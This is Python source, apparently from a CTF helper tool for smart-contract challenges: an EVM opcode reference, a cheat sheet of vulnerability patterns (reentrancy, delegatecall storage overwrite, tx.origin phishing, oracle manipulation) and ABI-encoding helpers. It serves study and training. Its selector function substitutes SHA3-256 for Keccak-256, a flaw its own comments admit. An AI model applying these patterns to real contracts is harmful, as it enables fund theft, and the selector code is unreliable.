        lines.append("  ISZERO      - 1 if a == 0 else 0")
        lines.append("")

        lines.append(f"[4] {t('bc.evm_flow_ops')}:")
        lines.append("  JUMP        - Unconditional jump to stack[0]")
        lines.append("  JUMPI       - Jump to stack[0] if stack[1] != 0")
        lines.append("  JUMPDEST    - Valid jump destination marker")
        lines.append("  STOP        - Halt execution (success)")
        lines.append("  REVERT      - Halt execution (revert)")
        lines.append("  RETURN      - Return data from memory")
        lines.append("")

        lines.append(f"[5] {t('bc.evm_env_ops')}:")
        lines.append("  CALLVALUE   - msg.value in wei")
        lines.append("  CALLDATALOAD - Load 32 bytes from calldata at offset")
        lines.append("  CALLDATASIZE - Size of calldata in bytes")
        lines.append("  CALLER      - msg.sender")
        lines.append("  ORIGIN      - tx.origin")
        lines.append("  NUMBER      - block.number")
        lines.append("  TIMESTAMP   - block.timestamp")
        lines.append("")

        lines.append(f"[6] {t('bc.evm_memory_ops')}:")
        lines.append("  MLOAD       - Load 32 bytes from memory")
        lines.append("  MSTORE      - Store 32 bytes to memory")
        lines.append("  MSTORE8     - Store 1 byte to memory")
        lines.append("  SLOAD       - Load from storage slot")
        lines.append("  SSTORE      - Store to storage slot")
        lines.append("")

        lines.append(f"[7] {t('bc.evm_puzzle_tips')}:")
        lines.append(f"  - {t('bc.tip_trace')}")
        lines.append(f"  - {t('bc.tip_jumpdest')}")
        lines.append(f"  - {t('bc.tip_callvalue')}")
        lines.append(f"  - {t('bc.tip_calldatasize')}")
        lines.append(f"  - {t('bc.tip_revert')}")
        lines.append(f"  - {t('bc.tip_stack')}")

        return "\n".join(lines)

    # ================================================================
    # 速查表 (1 个)
    # ================================================================

    def common_patterns(self, input: str = "") -> str:
        """CTF 区块链题目常见漏洞速查表"""
        lines = []
        lines.append(f"=== {t('bc.patterns_title')} ===")
        lines.append("")

        patterns = [
            (t('bc.pat_reentrancy'),
             t('bc.pat_reentrancy_desc'),
             "receive()/fallback() -> re-enter withdraw()"),

            (t('bc.pat_overflow'),
             t('bc.pat_overflow_desc'),
             "uint8 x = 255; x + 1 == 0  (Solidity < 0.8)"),

            (t('bc.pat_tx_origin'),
             t('bc.pat_tx_origin_desc'),
             "require(tx.origin == owner) -> phishing via proxy"),

            (t('bc.pat_selfdestruct'),
             t('bc.pat_selfdestruct_desc'),
             "selfdestruct(payable(target)) -> force send ETH"),

            (t('bc.pat_delegatecall'),
             t('bc.pat_delegatecall_desc'),
             "delegatecall to attacker contract -> overwrite storage"),

            (t('bc.pat_randomness'),
             t('bc.pat_randomness_desc'),
             "block.timestamp / blockhash / block.difficulty as seed"),

            (t('bc.pat_frontrun'),
             t('bc.pat_frontrun_desc'),
             "commit-reveal scheme / submarine send"),

            (t('bc.pat_access'),
             t('bc.pat_access_desc'),
             "missing onlyOwner / public initialize()"),

            (t('bc.pat_flashloan'),
             t('bc.pat_flashloan_desc'),
             "manipulate price oracle via large swap"),

            (t('bc.pat_storage'),
             t('bc.pat_storage_desc'),
             "private != invisible, web3.eth.getStorageAt()"),

            (t('bc.pat_dos'),
             t('bc.pat_dos_desc'),
             "unbounded loop / push pattern / block gas limit"),

            (t('bc.pat_signature'),
             t('bc.pat_signature_desc'),
             "missing nonce -> signature replay across chains"),
        ]

        for i, (name, desc, example) in enumerate(patterns, 1):
            lines.append(f"[{i:2d}] {name}")
            lines.append(f"     {desc}")
            lines.append(f"     Example: {example}")
            lines.append("")

        lines.append(f"{t('bc.patterns_footer')}")
        return "\n".join(lines)

    # ================================================================
    # 内部辅助方法
    # ================================================================

    @staticmethod
    def _compute_selector(signature: str) -> str:
        """计算函数选择器 (keccak256 前 4 字节)"""
        # 规范化：去除空格
        sig = re.sub(r'\s+', '', signature)
        digest = hashlib.sha3_256(sig.encode('utf-8')).digest()
        # 注意: Solidity 使用 Keccak-256，不是标准 SHA3-256
        # Python hashlib 提供的是标准 SHA3-256 (FIPS 202)
        # 对于 CTF 用途使用标准库实现，实际以太坊使用原始 Keccak
        # 这里提供近似结果；精确结果需要 pysha3/pycryptodome
        # 检查已知签名表优先
        if sig in SIGNATURE_TO_SELECTOR:
            return SIGNATURE_TO_SELECTOR[sig]
        return "0x" + digest[:4].hex()

    @staticmethod
    def _abi_encode_param(param_type: str, value: str) -> str:
        """ABI 编码单个参数为 32 字节十六进制"""
        value = value.strip()
        if param_type == 'address':
            addr = value.lower().replace('0x', '')
            return addr.zfill(64)
        elif param_type.startswith('uint') or param_type.startswith('int'):
            if value.startswith('0x') or value.startswith('0X'):
                n = int(value, 16)
            else:
                n = int(value)
            if n < 0:
                # 补码
                n = (1 << 256) + n
            return format(n, '064x')
        elif param_type == 'bool':
            return format(1 if value.lower() in ('true', '1') else 0, '064x')
        elif param_type.startswith('bytes') and param_type != 'bytes':
            # bytesN (fixed)
            hex_val = value.replace('0x', '')
            return hex_val.ljust(64, '0')
        else:
            # 默认当 uint256 处理
            try:
                n = int(value, 0)
                return format(n, '064x')
            except ValueError:
                # 字符串: hex 编码
                return value.encode('utf-8').hex().ljust(64, '0')
